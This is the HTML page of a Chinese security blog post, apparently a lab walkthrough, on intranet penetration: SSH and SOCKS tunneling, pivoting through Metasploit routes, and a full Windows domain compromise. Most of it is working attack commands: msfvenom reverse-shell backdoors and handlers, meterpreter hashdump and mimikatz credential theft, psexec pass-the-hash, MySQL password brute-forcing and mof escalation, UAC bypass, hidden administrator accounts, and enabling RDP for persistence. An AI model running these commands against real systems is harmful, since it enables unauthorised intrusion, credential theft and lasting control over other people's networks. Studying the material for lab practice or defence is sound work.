@@ -1,0 +1,400 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>内网渗透篇 | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">内网渗透篇</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/">2022-03-18</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>&nbsp;&bull;&nbsp;<a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91/">内网</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>[TOC]</p>
+<h1 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h1><h2 id="ssh隧道"><a href="#ssh隧道" class="headerlink" title="ssh隧道"></a>ssh隧道</h2><p>通常，我们用于调试的计算机无法远程访问位于局域网中的待调试设备。通过 ssh 的端口转发(又称 ssh 隧道)技术，可以实现这种远程调试功能。ssh 客户端运行于本地机器，它的作用是：登录到目标机器并在目标机器上执行命令。它可以建立一个安全通道，为不安全网络上两个不受信任的主机提供安全的加密通信。X11 连接、任意 TCP 端口和 UNIX 域套接字也可以通过 ssh 安全通道进行转发。ssh 连接并登录到指定的主机名(用户名可选)。如果指定了命令，命令将在远程主机上执行，而不是在本机 shell 里执行。</p>
+<p>ssh 端口转发相关的常用选项如下：</p>
+<hr>
+<p><strong>-C</strong></p>
+<p>请求压缩所有数据(包括 stdin、stdout、stderr 和用于转发的 X11、TCP 和 UNIX 域连接的数据)。压缩算法与 gzip 使用的算法相同，压缩级别由 ssh 协议版本 1 的 CompressionLevel 选项控制。在调制解调器线路和其他慢速连接上采用压缩是可取的，但它会减慢快速网络上的速度。</p>
+<hr>
+<p><strong>-f</strong></p>
+<p>请求 ssh 在执行命令之前转到后台。如果用户希望 ssh 在后台运行，但 ssh 需要用户提供密码或口令，使用 -f 选项就很有用，在用户输入密码之后，ssh 就会转入后台运行。这个选项隐含了 -n 选项的功能(-n 选项将 stdin 重定向到 /dev/null，从而避免后台进程读 stdin)。在远程站点上启动 X11 程序的推荐方法是使用 “ssh -f host xterm” 。</p>
+<p>如果 ExitOnForwardFailure 配置选项设置的是 “yes”，则使用 -f 选项启动的 ssh 客户端会等所有的远程端口转发建立成功后才将自己转到后台运行。</p>
+<hr>
+<p><strong>-n</strong></p>
+<p>将 stdin 重定向到 /dev/null (实际上是为了防止后台进程从stdin读取数据)。当 ssh 在后台运行时必须使用此选项。</p>
+<p>一个常见的技巧是使用它在目标机器上运行 X11 程序。例如，<code>ssh -n shadow.cs.hut.fi emacs &amp;</code> 将在 shadows.cs.hut.fi 上启动 emacs 程序。X11 的连接将通过加密通道自动转发。ssh 程序将在后台运行。(如果 ssh 需要请求密码或口令，则此操作无效；参见-f选项。)</p>
+<hr>
+<p><strong>-N</strong></p>
+<p>不执行远程命令。此选项用于只需要端口转发功能时。</p>
+<hr>
+<p><strong>-g</strong></p>
+<p>允许远程主机连接到本地转发端口。如果用于多路复用连接，则必须在主进程上指定此选项。</p>
+<hr>
+<p><strong>-t</strong></p>
+<p>强制分配一个伪终端。在目标机上执行任意的基于屏幕的程序时(例如，实现菜单服务)，分配伪终端很有用。使用多个 -t 选项则会强制分配终端，即使 ssh 没有本地终端。</p>
+<hr>
+<p><strong>-T</strong></p>
+<p>禁止分配伪终端。</p>
+<hr>
+<p><strong>-L [bind_address:]port:host:hostport</strong><br><strong>-L [bind_address:]port:remote_socket</strong><br><strong>-L local_socket:host:hostport</strong><br><strong>-L local_socket:remote_socket</strong></p>
+<p>数据从本机转发到远程。本机上指定 TCP 端口或 UNIX 套接字的连接将被转发到目标机上指定端口或套接字。</p>
+<p>上述参数中，bind_address 指本地地址；port 指本地端口；local_socket 指本地 UNIX 套接字；host 指远程主机地址；hostport 指远程端口；remote_socket 指远程 UNIX 套接字。</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318150851834.png" alt="image-20220318150851834"> </p>
+<p><strong>ssh 端口转发模式</strong></p>
+<p>ssh 的端口转发有三种模式：</p>
+<ul>
+<li><p><strong>本地：ssh -C -f -N -g -L local_listen_port:remote_host:remote_port agent_user@agent_host</strong></p>
+<p>将本地机监听端口 local_listen_port 上的数据转发到远程端口 remote_host:remote_port</p>
+</li>
+<li><p><strong>远程：ssh -C -f -N -g -R agent_listen_port:local_host:local_port agent_user@agent_host</strong></p>
+<p>将代理机监听端口 agent_listen_port 上的数据转发到本地端口 local_host:local_port</p>
+</li>
+<li><p><strong>动态：ssh -C -f -N -g -D listen_port agent_user@agent_host</strong></p>
+</li>
+</ul>
+<p><strong>正向连接</strong></p>
+<p>WEB服务器执行</p>
+<pre><code>ssh -CNfL 0.0.0.0:7777:10.10.10.128:80 web@192.168.0.144
+</code></pre>
+<p><strong>反向连接</strong></p>
+<p>在攻击机上启动ssh</p>
+<pre><code>/etc/init.d/ssh start
+</code></pre>
+<p>在web服务器上执行</p>
+<pre><code>ssh -qTfnN -R port:host:hostport remote_ip
+ssh -qTfnN -R 2222:127.0.0.1:22 root@192.168.0.115  # 将本地的22端口转发到192.168.0.115 的2222端口
+</code></pre>
+<p>攻击机上再执行</p>
+<pre><code>ssh -p 2222 web@127.0.0.1
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318161331485.png" alt="image-20220318161331485"></p>
+<p><strong>Socket代理</strong></p>
+<pre><code>SSH -qTfnN -D port remotehots
+</code></pre>
+<h2 id="端口转发与端口映射"><a href="#端口转发与端口映射" class="headerlink" title="端口转发与端口映射"></a>端口转发与端口映射</h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318213918972.png" alt="image-20220318213918972"></p>
+<p>生成metaploit后门</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.196 lport=12345 -f exe &gt;/var/www/html/sakura.exe
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.0.196
+set lport 12345
+exploit
+</code></pre>
+<p>当运行后门，得到反弹shell后</p>
+<p><strong>映射端口:</strong></p>
+<pre><code>portfwd add -L 192.168.0.115 -l 2020 -p 80 -r 10.10.10.128
+</code></pre>
+<p>此时我们访问 本机的2020端口 即打开192.168.0.115:2020 实际上访问的是 10.10.10.128:80 的服务</p>
+<p><strong>端口转发</strong></p>
+<pre><code>portfwd add -l 5555 -p 3389 -r 192.168.0.149 #将肉鸡的3389端口映射到本地的5555端口
+rdesktop 127.0.0.1:5555
+</code></pre>
+<p><strong>查看列表</strong></p>
+<pre><code>portfwd list
+</code></pre>
+<p><strong>清空列表</strong></p>
+<pre><code>portfwd flush
+</code></pre>
+<h2 id="socket隧道"><a href="#socket隧道" class="headerlink" title="socket隧道"></a>socket隧道</h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318220150442.png" alt="image-20220318220150442"></p>
+<p>​    下载地址:</p>
+<pre><code>http://sourceforge.net/project/ssocks/
+</code></pre>
+<p>解压编译:</p>
+<pre><code>tar zxvf ssocks-0.0.14.tar.gz
+cd ssocks-0.0.14
+./configure &amp;&amp; make #编译后会创建一个src文件夹
+cd src
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318221138321.png" alt="image-20220318221138321"></p>
+<p>kali机使用：</p>
+<pre><code>./rcsocks -l 1088 -p 1080 -vv
+</code></pre>
+<p>等待远程socks5服务器访问本地1080端口，创建端口1080与本地端口1088的连接通道</p>
+<p>web服务器:</p>
+<pre><code>/rssocks -vv -s 192.168.10.115:1080
+</code></pre>
+<p>利用proxychains进行Socks5代理</p>
+<p> 编辑proxychains工具</p>
+<pre><code>vim /etc/proxychains.conf
+</code></pre>
+<p>注释掉socks4，加上socks5</p>
+<pre><code>#socks4 127.0.0.1 9050
+socks5 127.0.0.1 1088
+</code></pre>
+<p>kail机使用代理访问：</p>
+<pre><code>proxychains firefox http://10.10.10.128
+</code></pre>
+<p>就会成功访问</p>
+<p>使用nmap扫描</p>
+<pre><code>proxychains nmap -Pn -sT 10.10.10.128
+</code></pre>
+<h1 id="跨路由扫描"><a href="#跨路由扫描" class="headerlink" title="跨路由扫描"></a>跨路由扫描</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318224021872.png" alt="image-20220318224021872"></p>
+<p>生成metaploit后门，并监听</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exe
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.0.115
+set lport 12345
+exploit
+</code></pre>
+<p>运行后门，得到反弹shell</p>
+<pre><code>getuid  查看当前用户
+ifconfig  获取网卡信息
+run get_local_subnets 获取路由信息
+run autoroute -p 查看当前路由
+run autoroute -s 10.10.10.0/24 增加路由 
+</code></pre>
+<p>使用socks4a模块</p>
+<pre><code>use auxiliary/server/socks4a
+</code></pre>
+<p>　SRVHOST：监听的ip地址，默认为0.0.0.0，一般不需要更改。<br>   SRVPORT：监听的端口，默认为1080。</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318225453685.png" alt="image-20220318225453685"></p>
+<p>设置端口</p>
+<pre><code>set SRVPORT 1044
+exploit
+</code></pre>
+<p>然后配置proxychains</p>
+<pre><code>vim /etc/proxychains.conf
+</code></pre>
+<p>proxychains.conf </p>
+<pre><code>socks4 192.168.0.115 1044
+</code></pre>
+<p>使用nmap扫描</p>
+<pre><code>proxychains nmap -sT Pn 10.10.10.128
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318230018344.png" alt="image-20220318230018344"></p>
+<p>也可以用浏览器访问</p>
+<pre><code>proxychains firefox http://10.10.10.128
+</code></pre>
+<p>缺点:</p>
+<p>无法进行爆破(如hydra)等一些操作</p>
+<h1 id="常见的内网测试渗透"><a href="#常见的内网测试渗透" class="headerlink" title="常见的内网测试渗透"></a>常见的内网测试渗透</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318231904664.png" alt="image-20220318231904664"></p>
+<p>生成metaploit后门，并监听</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exe
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.0.115
+set lport 12345
+exploit
+</code></pre>
+<p>运行后门，得到2003服务器反弹shell</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318234051072.png" alt="image-20220318234051072"></p>
+<p>查看路由表</p>
+<pre><code>route
+</code></pre>
+<p> <img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318234749786.png" alt="image-20220318234749786"></p>
+<p>增加路由</p>
+<pre><code>run autoroute -s 10.10.10.0/24
+</code></pre>
+<p>查看路由列表</p>
+<pre><code>run autoroute -p
+</code></pre>
+<p>清空路由</p>
+<pre><code>run autoroute -d
+</code></pre>
+<p>提权命令:</p>
+<pre><code>sysinfo 查看系统信息
+</code></pre>
+<pre><code>ps 查看进程
+</code></pre>
+<p> <img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235448756.png" alt="image-20220318235448756"></p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235621609.png" alt="image-20220318235621609"></p>
+<pre><code>getuid 当前用户
+getprivs 尽可能提升权限
+getsystem 通过各种攻击向量来提升系统用户权限
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235905714.png" alt="image-20220318235905714"></p>
+<p>增加管理员</p>
+<pre><code>net user sakura$ 123456 /add &amp; net localground administrators sakura$ /add
+</code></pre>
+<p>检测存活ip</p>
+<pre><code>run post/multi/gather/ping_sweep rhosts=10.10.10.0/24
+run post/windows/gather/arp_scanner rhosts=10.10.10.0/24
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319000735682.png" alt="image-20220319000735682"></p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319000816930.png" alt="image-20220319000816930"></p>
+<p> 增加路由表</p>
+<pre><code>run autoroute -s 10.10.10.0/24
+background
+use auxiliary/server/socks4a
+set SRVHOST 192.168.0.115 #端口默认是1080
+exploit
+vim /etc/proxychains.conf
+</code></pre>
+<pre><code>socks4 192.168.0.115 1080
+</code></pre>
+<pre><code>proxychains nmap -sT -Pn -P 445,22,80,3306 10.10.10.130-135 --open -oN 10.10.10.0.txt
+</code></pre>
+<p>445开放，尝试hash攻击</p>
+<p>hash获取</p>
+<pre><code>meterpreter &gt; hashdump
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319014555755.png" alt="image-20220319014555755"></p>
+<pre><code>ues exploit/windows/smb/psexec
+set payload windows/meterpreter/bind_tcp
+set rhost 10.10.10.131
+set SMBUser Administrator
+set SMBPass 44efcexxxxxxxxxxxxxxxxxxxxxxxx
+exploit
+</code></pre>
+<p>使用mimikatz来获取更多密码</p>
+<pre><code>meterpreter &gt; load mimikatz
+meterpreter &gt; msv  #获取hash密码
+meterpreter &gt; run getgui -e #开启3389端口
+meterpreter &gt; run getgui -u sakura -p 123456 #增加用户
+</code></pre>
+<pre><code>root@kali:~# proxychains rdesktop -u Administrator -p 123456 10.10.10.131 #登录3389端口
+</code></pre>
+<h1 id="一次完整的域渗透流程"><a href="#一次完整的域渗透流程" class="headerlink" title="一次完整的域渗透流程"></a>一次完整的域渗透流程</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319122142921.png" alt="image-20220319122142921"></p>
+<p>渗透前提:拿到了域客户机2008的shell</p>
+<p>生成metaploit后门，并监听</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exe
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.0.115
+set lport 12345
+exploit
+</code></pre>
+<p>运行后门，得到2008服务器反弹shell</p>
+<p>扫描内网的机器</p>
+<pre><code>run post/windows/gather/qrp_scanner rhosts=10.10.1.0/24
+</code></pre>
+<p>加入路由</p>
+<pre><code>background
+route add 10.10.1.3 255.255.255.0 1
+</code></pre>
+<p>使用扫描器</p>
+<pre><code>use scanner/portscan/tcp  #默认扫描1-10000端口
+set rhost 10.10.1.3
+exploit
+</code></pre>
+<p>通过扫描发现 10.10.1.3 的3306端口存在mysql服务</p>
+<p>进行弱口令攻击</p>
+<pre><code>use auxiliary/scanner/mysql/mysql_login
+set rhost 10.10.1.3
+set username root
+set pass_file /root/password.txt
+exploit
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319124232296.png" alt="image-20220319124232296"></p>
+<p>成功爆破出弱口令</p>
+<p>尝试使用mysql_mof提权,得到域客户机2003的session</p>
+<pre><code>use exploit/windows/mysql/mysql_mof
+set password 123456
+set rhost 10.10.1.3
+set username root
+set payload windows/metepreter/bind_tcp
+exploit
+</code></pre>
+<p>现在拿到了2003的系统权限，就可以使用一些命令进行信息搜集</p>
+<pre><code>new view /domain:moonsec #查看当前域用户
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319125543944.png" alt="image-20220319125543944"></p>
+<p>得到目标机ip</p>
+<pre><code>ping SERVERS2003
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319125634094.png" alt="image-20220319125634094"></p>
+<pre><code>net user /domain  #获取所有域的用户列表
+net group /domain #获取域用户组信息
+net group &quot;domain admins&quot; /domain #获取当前域管理员信息
+net time /domain #查看域实际及域服务器名字
+</code></pre>
+<p>可以得到域控信息</p>
+<pre><code>WIN-7230786H6KU.moonsec.com 10.10.1.2 #这个就是域控
+</code></pre>
+<p>因为普通域用户 需要更改系统信息 都需要通过域管理员的操作 要输入账号密码</p>
+<p>抓明文 mimikatz</p>
+<pre><code>meterpreter &gt; load mimikatz
+meterpreter &gt; msv  #获取hash密码
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319130901701.png" alt="image-20220319130901701"></p>
+<p>尝试能否抓明文</p>
+<pre><code>meterpreter &gt; kerberos #获取明文密码
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319132330184.png" alt="image-20220319132330184"></p>
+<p>现在想要获取session</p>
+<pre><code>use exploit/windows/smb/psexec
+set rhost 10.10.1.2
+set SMBDomain moonsec
+set SMBUser administrator
+set SMBPass xxx123456..
+set payload windows/meterpreter/bind_tcp
+exploit
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133243629.png" alt="image-20220319133243629"></p>
+<p>得到域控shell，但是权限不够</p>
+<pre><code>get privs
+getsystem
+</code></pre>
+<p>使用uac提权</p>
+<pre><code>use exploit/windows/local/ask
+set sessions 3
+exploit
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133844674.png" alt="image-20220319133844674"></p>
+<p>提权成功</p>
+<p>获取hash密码</p>
+<pre><code>meterpreter &gt; hashdump
+#或者
+meterpreter &gt;  run post/windows/gather/hashdump
+</code></pre>
+<p>mimikatz抓明文密码</p>
+<pre><code>meterpreter &gt; load mimikatz
+meterpreter &gt; msv  #获取hash密码
+meterpreter &gt; kerberos #获取明文密码
+meterpreter &gt; mimikatz_command -f samd::hashes #另一种方式获取hash值
+</code></pre>
+<p>权限维持：进程注入</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133930152.png" alt="image-20220319133930152"></p>
+<pre><code>meterpreter &gt; migrate 2804
+</code></pre>
+<p>开启域控远程连接</p>
+<pre><code>meterpreter &gt; run getgui -e
+</code></pre>
+<p>使用socks4a连接3389</p>
+<pre><code>run autoroute -s 10.10.1.0/24 255.255.255.0
+use auxiliary/server/socks4a
+set srvhost 10.10.1.2
+</code></pre>
+<p>配置pxoxychains.conf</p>
+<pre><code>vim /etc/proxychains.conf
+</code></pre>
+<pre><code>....
+socks4 192.168.0.115 1080
+</code></pre>
+<p>登录3389</p>
+<pre><code>root@kali:~ proxychains rdesktop 10.10.1.2 #登录3389端口
+</code></pre>
+<p>增加账号</p>
+<pre><code>meterpreter &gt; run getgui -u moonsec -p moonsec
+</code></pre>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/">https://sakurahack-y.github.io/2022/03/18/内网渗透篇/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E5%86%85%E7%BD%91/">内网</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">1.</span> <span class="toc-text">隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E9%9A%A7%E9%81%93"><span class="toc-number">1.1.</span> <span class="toc-text">ssh隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84"><span class="toc-number">1.2.</span> <span class="toc-text">端口转发与端口映射</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socket%E9%9A%A7%E9%81%93"><span class="toc-number">1.3.</span> <span class="toc-text">socket隧道</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B7%A8%E8%B7%AF%E7%94%B1%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text">跨路由扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%86%85%E7%BD%91%E6%B5%8B%E8%AF%95%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">常见的内网测试渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84%E5%9F%9F%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">一次完整的域渗透流程</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Fastjson漏洞复现 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
